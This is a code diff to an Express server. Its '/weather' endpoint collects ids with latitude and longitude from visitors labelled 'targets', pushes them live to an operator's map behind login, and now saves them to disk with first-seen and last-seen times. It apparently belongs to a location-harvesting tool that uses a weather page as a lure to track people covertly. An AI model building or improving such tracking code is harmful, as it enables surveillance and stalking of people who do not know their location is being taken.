@@ -1,9 +1,10 @@
 const express = require("express")
 const router = express.Router()
 const config = require("./config")
+const { loadTargets, saveTargets } = require("./storage")
 
 
-const TARGETS = {}
+const TARGETS = loadTargets()
 
 // login page 
 router.route("/login").get((req, res) => {
@@ -22,14 +23,39 @@ router.route("/weather").get((req, res) => {
     res.render("weather")
 }).post((req, res) => {
     const { id, lat, lng } = req.body
-    if (TARGETS[id] == null) {
-        IO.emit("user-connected", id)
+    if (typeof id !== "string" || id.length === 0 || !Number.isFinite(Number(lat)) || !Number.isFinite(Number(lng))) {
+        return res.status(400).send("Invalid location data")
     }
 
-    TARGETS[id] = [lat, lng]
-    IO.emit("map-data", { id, lat, lng })
+    const now = new Date().toISOString()
+    const isNewTarget = TARGETS[id] == null
+
+    if (isNewTarget) {
+        TARGETS[id] = {
+            location: [Number(lat), Number(lng)],
+            firstSeen: now,
+            lastSeen: now,
+        }
+    } else {
+        TARGETS[id].location = [Number(lat), Number(lng)]
+        TARGETS[id].lastSeen = now
+    }
+
+    saveTargets(TARGETS)
+    IO.emit("user-connected", {
+        id,
+        firstSeen: TARGETS[id].firstSeen,
+        lastSeen: TARGETS[id].lastSeen,
+    })
+    IO.emit("map-data", {
+        id,
+        lat,
+        lng,
+        firstSeen: TARGETS[id].firstSeen,
+        lastSeen: TARGETS[id].lastSeen,
+    })
     res.send("OK")
-    console.log(`> ${id} - ${TARGETS[id]}`)
+    console.log(`> ${id} - ${TARGETS[id].location} - ${now}`)
 })
 
 // token checking
@@ -52,9 +78,8 @@ router.route("/").get((req, res) => {
 router.route("/map").get((req, res) => {
     const { id } = req.query
 
-    res.render("map", {
-        data: TARGETS[id]
-    })
+    const target = TARGETS[id]
+    res.render("map", { data: target ? target.location : null })
 })
 
 
